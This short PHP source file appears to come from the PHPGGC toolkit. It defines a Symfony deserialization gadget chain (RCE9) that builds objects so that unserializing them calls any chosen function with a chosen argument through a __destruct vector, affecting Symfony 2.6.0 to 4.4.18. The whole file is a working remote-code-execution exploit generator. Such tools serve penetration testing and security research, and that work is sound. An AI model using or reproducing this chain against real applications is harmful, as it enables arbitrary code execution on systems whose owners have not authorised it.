<?php

namespace GadgetChain\Symfony;

class RCE9 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.6.0 <= 4.4.18';
    public static $vector = '__destruct';
    public static $author = 'cfreal';

    public function generate(array $parameters)
    {
        $a = new \ArrayObject([
            $parameters["function"],
            $parameters["parameter"]
        ]);
        $b = new \Symfony\Component\Finder\Iterator\SortableIterator($a, "call_user_func");
        $c = new \Symfony\Component\Process\Pipes\WindowsPipes($b);
        return $c;
    }
}